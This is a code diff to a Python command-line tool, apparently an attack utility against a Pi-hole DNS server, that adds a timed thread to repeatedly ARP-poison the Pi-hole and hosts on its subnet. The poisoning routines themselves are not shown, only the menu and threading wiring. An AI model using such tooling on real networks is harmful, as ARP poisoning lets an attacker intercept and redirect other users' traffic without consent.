@@ -1,8 +1,12 @@
+from time import sleep
+
 from scapy.all import *
 from dns import Dns
 from arp import Arp
 from discovery import Discovery
 from configuration import *
+
+from RepeatedTimer import RepeatedTimer
 
 mainText = "Enter the number of the method you want to use:\n\
     1. Pi-hole discovery\n\
@@ -34,7 +38,7 @@ def mainCLI():
         elif inp.lower().strip() == "5":  # Change settings
             settingsCLI()
         elif inp.lower().strip() == "6":  # Exit
-            return
+            sys.exit()
         else:  # Error
             print("Please only enter a number 1-6\n")
 
@@ -66,9 +70,15 @@ def discoveryCLI():
 
 
 # ================================= ARP ====================================
+def ARPPoisoning(setting):
+    if len(setting) == 2:
+        arp.poison_all(conf.getDNSsetting(), PiIP, arp.get_dns_mac(PiIP), False)
+        print("Thread")
+    else:
+        arp.poison_all(conf.getARPtarget(), PiIP, arp.get_dns_mac(PiIP), False)
 
 def ARPCLI():
-    # PiIP = '192.168.0.10'
+    #PiIP = '192.168.0.10'
     if PiIP == "" or PiIP is None:
         print("IP of the Pi-hole was not set, please run Discovery first.")
         return
@@ -83,25 +93,28 @@ def ARPCLI():
 
     inp = input("Do you want to continue? (Y/n): ")
 
-    # TODO: launch ARP poisoning in a thread every getARPdelay() seconds
     if inp.lower().strip() == "y" or inp.lower().strip() == "yes" or len(inp.strip()) == 0:
 
-        # ARP poisoning
+        # ARP poisoning, initial call
 
         # If target is all hosts on DNS server's subnet
         if len(setting) == 2:
             print("Performing poisoning on " + conf.getDNSsetting())
-            if arp.poison_all(conf.getDNSsetting(), PiIP, arp.get_dns_mac(PiIP)):
+            if arp.poison_all(conf.getDNSsetting(), PiIP, arp.get_dns_mac(PiIP), True):
                 ARPresult = True
 
         # Otherwise
         else:
             print("Performing poisoning on " + conf.getARPtarget())
-            if arp.poison_all(conf.getARPtarget(), PiIP, arp.get_dns_mac(PiIP)):
+            if arp.poison_all(conf.getARPtarget(), PiIP, arp.get_dns_mac(PiIP), True):
                 ARPresult = True
 
         if ARPresult:
             print("Pi-hole was successfully poisoned")
+            # ARP poisoning, threading
+            thread = RepeatedTimer(conf.getARPdelay(), ARPPoisoning, setting)
+            #thread.start()
+            # TODO: Find a way to stop the thread when leaving app
             return
         else:
             print("Poisoning was not successful. Please try again.")
